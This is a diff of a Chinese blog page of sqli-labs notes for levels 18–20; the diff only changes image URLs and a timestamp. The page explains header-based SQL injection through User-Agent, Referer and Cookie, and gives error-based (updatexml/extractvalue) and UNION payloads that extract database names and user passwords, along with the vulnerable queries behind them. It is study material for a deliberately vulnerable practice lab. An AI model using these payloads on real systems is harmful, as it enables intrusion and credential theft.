@@ -19,25 +19,25 @@
   <meta name="author" content="aidemofashi">
   <meta name="keywords" content="">
   
-    <meta name="description" content="less18 可能是叫做报头注入在有头部回显的状况下用   如图payload 1User-Agent: &#x27; or updatexml(1,concat(&#x27;!&#x27;,(database())),1),2,3)#     因为源码里有检查三个参数，所以要输入三个参数，或者用 12345&#x27; or extractvalue(1,concat(0x7e,database">
+    <meta name="description" content="less18 可能是叫做报头注入在有头部回显的状况下用   如图payload 1User-Agent: &#x27; or updatexml(1,concat(&#x27;!&#x27;,(database())),1),2,3)#    因为源码里有检查三个参数，所以要输入三个参数，或者用 12345&#x27; or extractvalue(1,concat(0x7e,database(">
 <meta property="og:type" content="article">
 <meta property="og:title" content="note-10">
 <meta property="og:url" content="https://aidemofashi.github.io/2025/03/10/note-10/index.html">
 <meta property="og:site_name" content="aidemofashi&#39;s blog">
-<meta property="og:description" content="less18 可能是叫做报头注入在有头部回显的状况下用   如图payload 1User-Agent: &#x27; or updatexml(1,concat(&#x27;!&#x27;,(database())),1),2,3)#     因为源码里有检查三个参数，所以要输入三个参数，或者用 12345&#x27; or extractvalue(1,concat(0x7e,database">
+<meta property="og:description" content="less18 可能是叫做报头注入在有头部回显的状况下用   如图payload 1User-Agent: &#x27; or updatexml(1,concat(&#x27;!&#x27;,(database())),1),2,3)#    因为源码里有检查三个参数，所以要输入三个参数，或者用 12345&#x27; or extractvalue(1,concat(0x7e,database(">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://aidemofashi.github.io/%5Cimg%5Cnote-10%5C1.png">
-<meta property="og:image" content="https://aidemofashi.github.io/%5Cimg%5Cnote-10%5C2.png">
-<meta property="og:image" content="https://aidemofashi.github.io/%5Cimg%5Cnote-10%5C3.png">
-<meta property="og:image" content="https://aidemofashi.github.io/%5Cimg%5Cnote-10%5C4.png">
-<meta property="og:image" content="https://aidemofashi.github.io/%5Cimg%5Cnote-10%5C5.png">
-<meta property="og:image" content="https://aidemofashi.github.io/%5Cimg%5Cnote-10%5C6.png">
+<meta property="og:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/1.png">
+<meta property="og:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/2.png">
+<meta property="og:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/3.png">
+<meta property="og:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/4.png">
+<meta property="og:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/5.png">
+<meta property="og:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/6.png">
 <meta property="article:published_time" content="2025-03-10T13:45:47.000Z">
-<meta property="article:modified_time" content="2025-03-11T03:43:59.886Z">
+<meta property="article:modified_time" content="2025-03-11T05:13:28.568Z">
 <meta property="article:author" content="aidemofashi">
 <meta property="article:tag" content="sql-labs">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://aidemofashi.github.io/%5Cimg%5Cnote-10%5C1.png">
+<meta name="twitter:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/1.png">
   
   
   
@@ -286,8 +286,7 @@
                 <h1 id="less18-可能是叫做报头注入"><a href="#less18-可能是叫做报头注入" class="headerlink" title="less18 可能是叫做报头注入"></a>less18 可能是叫做报头注入</h1><p>在有头部回显的状况下用  </p>
 <p>如图payload</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(database())),1),2,3)#<br></code></pre></td></tr></table></figure>
-
-<p><img src="/%5Cimg%5Cnote-10%5C1.png" srcset="/img/loading.gif" lazyload>  </p>
+<p><img src="http://39.105.15.250/aidemofashi_home/img/note-10/1.png" srcset="/img/loading.gif" lazyload>  </p>
 <p>因为源码里有检查三个参数，所以要输入三个参数，或者用</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http">&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;<br>```  <br>闭合，此时后端代码就会变成<br>```sql<br>$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;&#x27;, &#x27;$IP&#x27;, $uname)&quot;;<br></code></pre></td></tr></table></figure>
 <p>前后两端的’是为了闭合原有的单引号中间用and，or等连接即可。</p>
@@ -303,7 +302,7 @@
 <blockquote>
 <p>闭合表达式：通过or ‘’闭合整个表达式，确保语法正确。  </p>
 </blockquote>
-<p><img src="/%5Cimg%5Cnote-10%5C2.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://39.105.15.250/aidemofashi_home/img/note-10/2.png" srcset="/img/loading.gif" lazyload>  </p>
 <p>最终payload</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">User</span>-Agent: &#x27; or extractvalue(<span class="hljs-number">1</span>,concat(&#x27;!&#x27;,(select concat(username,<span class="hljs-number">2</span>,password)from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)#<br><br><span class="hljs-attribute">User</span>-Agent: &#x27; or extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,database())),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure>
 <p>为什么要用 or 或 and 连接:</p>
@@ -313,18 +312,18 @@
 <p>相比上一关只有两个参数，所以可以这样</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(databass())),1),2)#  //爆数据库<br><br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;security&#x27;)),1),2)#  //爆表名<br><br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(select concat(column_name)from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1)),1),2)#   <br>//分段回显<br><br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(select concat(id,username,&#x27;!&#x27;,password)from users limit 0,1)),1),2)#<br>//最后一行行爆<br></code></pre></td></tr></table></figure>
 
-<p><img src="/%5Cimg%5Cnote-10%5C3.png" srcset="/img/loading.gif" lazyload><br>也可以这样</p>
+<p><img src="http://39.105.15.250/aidemofashi_home/img/note-10/3.png" srcset="/img/loading.gif" lazyload><br>也可以这样</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;<br></code></pre></td></tr></table></figure>
 
-<h1 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h1><p>题目提示cookie注入，登录正确的账户名出现以下界面<br><img src="/%5Cimg%5Cnote-10%5C4.png" srcset="/img/loading.gif" lazyload><br>表头如下：</p>
+<h1 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h1><p>题目提示cookie注入，登录正确的账户名出现以下界面<br><img src="http://39.105.15.250/aidemofashi_home/img/note-10/4.png" srcset="/img/loading.gif" lazyload><br>表头如下：</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/sqli-labs/Less-20/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;122&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/sqli-labs/Less-20/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=admin<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure>
-<p>cookie只有一个unmae？<br>尝试在uname注入<br><img src="/%5Cimg%5Cnote-10%5C5.png" srcset="/img/loading.gif" lazyload></p>
+<p>cookie只有一个unmae？<br>尝试在uname注入<br><img src="http://39.105.15.250/aidemofashi_home/img/note-10/5.png" srcset="/img/loading.gif" lazyload>  </p>
 <p>发现注入点</p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">Cookie: uname=&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(id,username,<span class="hljs-string">&#x27;!&#x27;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure>
 
 <p>可能是该后端代码造成了注入</p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql=&quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;$cookee&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure>
-<p><img src="/%5Cimg%5Cnote-10%5C6.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://39.105.15.250/aidemofashi_home/img/note-10/6.png" srcset="/img/loading.gif" lazyload>  </p>
 
                 
               </div>
